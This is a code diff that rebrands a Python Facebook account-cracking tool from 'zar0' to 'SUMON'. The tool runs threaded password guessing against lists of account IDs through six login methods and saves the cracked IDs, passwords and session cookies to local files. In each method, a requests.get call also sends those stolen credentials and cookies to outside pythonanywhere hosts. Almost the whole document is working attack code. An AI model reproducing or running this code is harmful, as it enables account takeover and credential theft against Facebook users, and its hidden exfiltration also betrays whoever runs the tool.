@@ -225,7 +225,7 @@ if uxernamx=='GREEN.py':
     except:
         print('   Somting Wrong Bro')
         idx()
-    if 'zar0-XD' in readhead:
+    if 'SUMON-XD' in readhead:
         pass
     else:
         idx()
@@ -265,28 +265,28 @@ class Process:
         c.close()
         return buffer.getvalue().decode('utf-8')
     def enroll(self):
-        zar0()
+        SUMON()
 
 #━━━━[ MAIN ]━━━━#
-def zar0():
+def SUMON():
     ____banner____()
     print(f'{rad}[{white}A{rad}]{rad}[{white}1{rad}] {green}KEEP ON FILE CLONE')
     print(f'{rad}[{white}B{rad}]{rad}[{white}2{rad}] {green}DUMP IT MAKE FILES')
     print(f'{rad}[{white}C{rad}]{rad}[{white}3{rad}] {green}EXIT')
     print(f'{rad}[{white}D{rad}]{rad}[{white}4{rad}] {green}JOIN GROUP')
     print(f'{rad}[{white}E{rad}]{rad}[{white}5{rad}] {green}CONTRACK ADMIN');linex()
-    __zar0__ = input(f'{rad}[{white}🔖{rad}] {green}Selection  {white}▶︎ {yelloww}')
-    if __zar0__ in ['A','a','01','1']:__FILEX__()
-    elif __zar0__ in ['B','b','02','2']:os.system('python3 FILE-DUMP.py')
-    elif __zar0__ in ['C','c','03','3']:zar0()
-    elif __zar0__ in ['D','d','04','4']:os.system("xdg-open https://chat.whatsapp.com/IFiBzDX9PFJEF8ELHtHGdt")
-    elif __zar0__ in ['E','e','05','5']:os.system("xdg-open https://wa.me/+918389066877")
-    else:print(f'\n[×]{rad} Choose Value Option... ');zar0()
+    __SUMON__ = input(f'{rad}[{white}🔖{rad}] {green}Selection  {white}▶︎ {yelloww}')
+    if __SUMON__ in ['A','a','01','1']:__FILEX__()
+    elif __SUMON__ in ['B','b','02','2']:os.system('python3 FILE-DUMP.py')
+    elif __SUMON__ in ['C','c','03','3']:SUMON()
+    elif __SUMON__ in ['D','d','04','4']:os.system("xdg-open https://chat.whatsapp.com/IFiBzDX9PFJEF8ELHtHGdt")
+    elif __SUMON__ in ['E','e','05','5']:os.system("xdg-open https://wa.me/+918389066877")
+    else:print(f'\n[×]{rad} Choose Value Option... ');SUMON()
 
 def __FILEX__():
     global oks,cps
     ____banner____()
-    dfile = input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}/sdcard/zar0.txt{rad}]\n{rad}[{white}🔖{rad}] {green}INPUT FILE PATH {white}▶︎ {yelloww}');linex()
+    dfile = input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}/sdcard/SUMON.txt{rad}]\n{rad}[{white}🔖{rad}] {green}INPUT FILE PATH {white}▶︎ {yelloww}');linex()
     try:
         dx = open(dfile,'r').read().splitlines()
     except FileNotFoundError:
@@ -299,7 +299,7 @@ def __FILEX__():
     for i in range(pass_lmit):
         dplist.append(input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}firstlast-first@12-ETC{rad}]\n{rad}[{white}🔖{rad}] {green}PASSWORD ➡ {i+1} {white}▶︎ {yelloww}'));linex()
     __METHOD__ = input(f"{rad}[{white}A{rad}]{green} METHOD M1\n{rad}[{white}B{rad}] {green}METHOD M2 \n{rad}[{white}C{rad}] {green}METHOD M3 \n{rad}[{white}D{rad}] {green}METHOD M4\n{rad}[{white}E{rad}] {green}METHOD M5 \n{rad}[{white}F{rad}] {green}METHOD M6 \n{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{rad}[{white}🔖{rad}] {green}SELECTION {white}▶︎ {yelloww}");os.system('clear')
-    with ThreadPool(max_workers=60) as zar0:
+    with ThreadPool(max_workers=60) as SUMON:
         ____banner____();total_ids = str(len(dx))
         print(f'{rad}[{white}🔖{rad}] {green}TOTAL IDS  {white}▶︎ \x1b[38;5;38m{total_ids}{rad} ! {green}METHOD {white}▶︎ \x1b[38;5;38m{__METHOD__}')
         print(f'{rad}[{white}🔖{green}] TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' )
@@ -308,19 +308,19 @@ def __FILEX__():
             ids,names = user.split('|')
             passlist = dplist
             if __METHOD__ in ["A","a","1","01"]:
-                zar0.submit(__MTDONEE__,ids,names,passlist,total_ids)
+                SUMON.submit(__MTDONEE__,ids,names,passlist,total_ids)
             elif __METHOD__ in ["B","b","2","02"]:
-                zar0.submit(__MTDTWOO__,ids,names,passlist,total_ids)
+                SUMON.submit(__MTDTWOO__,ids,names,passlist,total_ids)
             elif __METHOD__ in ["C","c","3","03"]:
-                zar0.submit(__MTDTHREE__,ids,names,passlist,total_ids)
+                SUMON.submit(__MTDTHREE__,ids,names,passlist,total_ids)
             elif __METHOD__ in ["D","d","4","04"]:
-                zar0.submit(__MTDFOUR__,ids,names,passlist,total_ids)
+                SUMON.submit(__MTDFOUR__,ids,names,passlist,total_ids)
             elif __METHOD__ in ["E","e","5","05"]:
-                zar0.submit(__MTDFIVE__,ids,names,passlist,total_ids)
+                SUMON.submit(__MTDFIVE__,ids,names,passlist,total_ids)
             elif __METHOD__ in ["F","f","6","06"]:
-                zar0.submit(__MTDSIX__,ids,names,passlist,total_ids)
+                SUMON.submit(__MTDSIX__,ids,names,passlist,total_ids)
             else:
-                zar0.submit(__MTDONEE__,ids,names,passlist,total_ids)
+                SUMON.submit(__MTDONEE__,ids,names,passlist,total_ids)
     print('');linex()
     print(f"{rad}[{white}🔖{rad}] {green}THE PROCESS HAS COMPLETE")
     print(f"{rad}[{white}🔖{rad}] {green}TOTAL OKS  {white}▶︎ {green}{len(oks)}")
@@ -328,7 +328,7 @@ def __FILEX__():
 
 def __MTDONEE__(ids, names, passlist, total_ids):
     global oks,cps,loop
-    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
+    animasi = random.choice(["\x1b[1;91mSUMON","\x1b[1;92mSUMON","\x1b[1;93mSUMON","\x1b[1;94mSUMON","\x1b[1;95mSUMON","\x1b[1;96mSUMON","\x1b[1;97mSUMON","\x1b[1;91mSUMON","\x1b[1;92mSUMON","\x1b[1;93mSUMON","\x1b[1;94mSUMON","\x1b[1;95mSUMON","\x1b[1;96mSUMON"])
     sys.stdout.write(f"\r{rad}[{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
     sys.stdout.flush()
     try:
@@ -388,16 +388,16 @@ def __MTDONEE__(ids, names, passlist, total_ids):
             if 'access_token' in q:
                 response_data = json.loads(po)
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
-                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
-                #print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
+                print(f'\r\r{rad}[{green}SUMON-OK{rad}]{green} {ids} {rad}: {green}{pas}')
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                 requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={ids}|{pas}|{cookie}")
                 oks.append(ids)
-                open('/sdcard/zar0-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M1-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/SUMON-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SUMON-M1-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 break
             elif "www.facebook.com" in q["error"]["message"]:
                 cps.append(ids)
-                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
-                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                print(f'\r\r{rad}[SUMON-CP]{rad} {ids} {rad}| {pas}')
+                open('/sdcard/SUMON-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
                 continue
@@ -410,7 +410,7 @@ def __MTDONEE__(ids, names, passlist, total_ids):
 
 def __MTDTWOO__(ids, names, passlist, total_ids):
     global oks,cps,loop
-    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
+    animasi = random.choice(["\x1b[1;91mSUMON","\x1b[1;92mSUMON","\x1b[1;93mSUMON","\x1b[1;94mSUMON","\x1b[1;95mSUMON","\x1b[1;96mSUMON","\x1b[1;97mSUMON","\x1b[1;91mSUMON","\x1b[1;92mSUMON","\x1b[1;93mSUMON","\x1b[1;94mSUMON","\x1b[1;95mSUMON","\x1b[1;96mSUMON"])
     sys.stdout.write(f"\r{rad}[{animasi}-M2{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
     sys.stdout.flush()
     try:
@@ -485,16 +485,16 @@ def __MTDTWOO__(ids, names, passlist, total_ids):
             if 'access_token' in q:
                 response_data = json.loads(po)
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
-                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
+                print(f'\r\r{rad}[{green}SUMON-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                 #print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                 requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={ids}|{pas}|{cookie}")
                 oks.append(ids)
-                open('/sdcard/zar0-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M2-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/SUMON-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SUMON-M2-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
-                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
-                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                #print(f'\r\r{rad}[SUMON-CP]{rad} {ids} {rad}| {pas}')
+                open('/sdcard/SUMON-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
                 continue
@@ -507,7 +507,7 @@ def __MTDTWOO__(ids, names, passlist, total_ids):
 
 def __MTDTHREE__(ids, names, passlist, total_ids):
     global oks,cps,loop
-    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
+    animasi = random.choice(["\x1b[1;91mSUMON","\x1b[1;92mSUMON","\x1b[1;93mSUMON","\x1b[1;94mSUMON","\x1b[1;95mSUMON","\x1b[1;96mSUMON","\x1b[1;97mSUMON","\x1b[1;91mSUMON","\x1b[1;92mSUMON","\x1b[1;93mSUMON","\x1b[1;94mSUMON","\x1b[1;95mSUMON","\x1b[1;96mSUMON"])
     sys.stdout.write(f"\r{rad}[{animasi}-M3{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
     sys.stdout.flush()
     try:
@@ -582,16 +582,16 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
             if 'access_token' in q:
                 response_data = json.loads(po)
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
-                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
+                print(f'\r\r{rad}[{green}SUMON-OK{rad}]{green} {ids} {rad}: {green}{pas}')
              #   print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                 oks.append(ids)
                 requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={ids}|{pas}|{cookie}")
-                open('/sdcard/zar0-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M3-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/SUMON-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SUMON-M3-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
-                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
-                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                #print(f'\r\r{rad}[SUMON-CP]{rad} {ids} {rad}| {pas}')
+                open('/sdcard/SUMON-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
                 continue
@@ -604,7 +604,7 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
 
 def __MTDFOUR__(ids, names, passlist, total_ids):
     global oks,cps,loop
-    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
+    animasi = random.choice(["\x1b[1;91mSUMON","\x1b[1;92mSUMON","\x1b[1;93mSUMON","\x1b[1;94mSUMON","\x1b[1;95mSUMON","\x1b[1;96mSUMON","\x1b[1;97mSUMON","\x1b[1;91mSUMON","\x1b[1;92mSUMON","\x1b[1;93mSUMON","\x1b[1;94mSUMON","\x1b[1;95mSUMON","\x1b[1;96mSUMON"])
     sys.stdout.write(f"\r{rad}[{animasi}-M4{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
     sys.stdout.flush()
     try:
@@ -679,16 +679,16 @@ def __MTDFOUR__(ids, names, passlist, total_ids):
             if 'access_token' in q:
                 response_data = json.loads(po)
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
-                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
+                print(f'\r\r{rad}[{green}SUMON-OK{rad}]{green} {ids} {rad}: {green}{pas}')
         #        print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                 oks.append(ids)
                 requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={ids}|{pas}|{cookie}")
-                open('/sdcard/zar0-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M4-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/SUMON-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SUMON-M4-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
-                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
-                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                #print(f'\r\r{rad}[SUMON-CP]{rad} {ids} {rad}| {pas}')
+                open('/sdcard/SUMON-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
                 continue
@@ -701,7 +701,7 @@ def __MTDFOUR__(ids, names, passlist, total_ids):
 
 def __MTDFIVE__(ids, names, passlist, total_ids):
     global oks,cps,loop
-    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
+    animasi = random.choice(["\x1b[1;91mSUMON","\x1b[1;92mSUMON","\x1b[1;93mSUMON","\x1b[1;94mSUMON","\x1b[1;95mSUMON","\x1b[1;96mSUMON","\x1b[1;97mSUMON","\x1b[1;91mSUMON","\x1b[1;92mSUMON","\x1b[1;93mSUMON","\x1b[1;94mSUMON","\x1b[1;95mSUMON","\x1b[1;96mSUMON"])
     sys.stdout.write(f"\r{rad}[{animasi}-M5{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
     sys.stdout.flush()
     try:
@@ -782,16 +782,16 @@ def __MTDFIVE__(ids, names, passlist, total_ids):
             if 'access_token' in q:
                 response_data = json.loads(po)
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
-                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
+                print(f'\r\r{rad}[{green}SUMON-OK{rad}]{green} {ids} {rad}: {green}{pas}')
               #  print(f"\r\r{rad}[{green}COOKIES=[??]{rad}]: {warna}{cookie}")
                 oks.append(ids)
                 requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={ids}|{pas}|{cookie}")
-                open('/sdcard/zar0-M5-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M5-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/SUMON-M5-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SUMON-M5-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
-                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
-                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                #print(f'\r\r{rad}[SUMON-CP]{rad} {ids} {rad}| {pas}')
+                open('/sdcard/SUMON-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
                 continue
@@ -803,7 +803,7 @@ def __MTDFIVE__(ids, names, passlist, total_ids):
 
 def __MTDSIX__(ids, names, passlist, total_ids):
     global oks,cps,loop
-    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
+    animasi = random.choice(["\x1b[1;91mSUMON","\x1b[1;92mSUMON","\x1b[1;93mSUMON","\x1b[1;94mSUMON","\x1b[1;95mSUMON","\x1b[1;96mSUMON","\x1b[1;97mSUMON","\x1b[1;91mSUMON","\x1b[1;92mSUMON","\x1b[1;93mSUMON","\x1b[1;94mSUMON","\x1b[1;95mSUMON","\x1b[1;96mSUMON"])
     sys.stdout.write(f"\r{rad}[{animasi}-M6{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
     sys.stdout.flush()
     try:
@@ -872,5 +872,5 @@ def __MTDSIX__(ids, names, passlist, total_ids):
 
 os.system("clear")
 #Process()
-zar0()  
+SUMON()  
     
